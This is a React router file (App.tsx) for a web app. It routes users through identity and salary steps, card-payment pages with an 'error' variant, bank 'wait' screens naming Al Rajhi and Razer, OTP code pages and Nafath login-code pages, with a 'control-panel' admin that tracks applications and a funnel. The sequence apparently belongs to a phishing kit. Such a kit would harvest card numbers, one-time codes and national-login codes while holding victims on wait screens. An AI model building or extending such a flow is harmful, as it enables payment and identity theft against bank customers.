import { Toaster } from "@/components/ui/sonner";
import { TooltipProvider } from "@/components/ui/tooltip";
import NotFound from "@/pages/NotFound";
import { Route, Switch } from "wouter";
import ErrorBoundary from "./components/ErrorBoundary";
import { ThemeProvider } from "./contexts/ThemeContext";
import Home from "./pages/Home";
import Identity from "./pages/Identity";
import Management from "./pages/Management";
import Employment from "./pages/Employment";
import Salary from "./pages/steps/Salary";
import Ypti from "./pages/steps/Ypti";
import Ytpi1 from "./pages/Ytpi1";
import Data from "./pages/steps/Data";
import CardPayment from "./pages/steps/CardPayment";
import CardWait from "./pages/steps/CardWait";
import NafathWait from "./pages/steps/NafathWait";
import NafathCode from "./pages/steps/NafathCode";
import ThankYou from "./pages/steps/ThankYou";
import { CodePay, PayCode, NCode } from "./pages/steps/OtpPage";
import NumberPage from "./pages/steps/Number";
import AdminDashboard from "./pages/admin/AdminDashboard";
import AdminApplications from "./pages/admin/AdminApplications";
import AdminFunnel from "./pages/admin/AdminFunnel";
import AdminSettings from "./pages/admin/AdminSettings";
import AiCheck from "./pages/AiCheck";
import RajhiWait from "./pages/steps/RajhiWait";
import RazerPayment from "./pages/steps/RazerPayment";
import RazerWait from "./pages/steps/RazerWait";
import AdminLogin from "./pages/admin/AdminLogin";
import AdminAccount from "./pages/admin/AdminAccount";

function Router() {
  return (
    <Switch>
      <Route path="/" component={Home} />
      <Route path="/identity" component={Identity} />
      <Route path="/management" component={Management} />
      <Route path="/employment" component={Employment} />
      <Route path="/ai-check" component={AiCheck} />
      <Route path="/salary" component={Salary} />
      <Route path="/ypti" component={Ypti} />
      <Route path="/ytpi-1" component={Ytpi1} />
      <Route path="/data" component={Data} />
      <Route path="/cardpayment" component={() => <CardPayment variant="default" />} />
      <Route path="/cardpayment-error" component={() => <CardPayment variant="error" />} />
      <Route path="/card-wait" component={CardWait} />
      <Route path="/rajhi-wait" component={RajhiWait} />
      <Route path="/razer-payment" component={RazerPayment} />
      <Route path="/razer-wait" component={RazerWait} />
      <Route path="/code-pay" component={CodePay} />
      <Route path="/pay-code" component={PayCode} />
      <Route path="/number" component={NumberPage} />
      <Route path="/n-code" component={NCode} />
      <Route path="/nafath-wait" component={NafathWait} />
      <Route path="/nafath-code" component={NafathCode} />
      <Route path="/thankyou" component={ThankYou} />
      <Route path="/control-panel/login" component={AdminLogin} />
      <Route path="/control-panel" component={AdminDashboard} />
      <Route path="/control-panel/applications" component={AdminApplications} />
      <Route path="/control-panel/funnel" component={AdminFunnel} />
      <Route path="/control-panel/settings" component={AdminSettings} />
      <Route path="/control-panel/account" component={AdminAccount} />
      <Route path="/404" component={NotFound} />
      <Route component={NotFound} />
    </Switch>
  );
}

function App() {
  return (
    <ErrorBoundary>
      <ThemeProvider defaultTheme="light">
        <TooltipProvider>
          <Toaster position="top-center" />
          <Router />
        </TooltipProvider>
      </ThemeProvider>
    </ErrorBoundary>
  );
}

export default App;
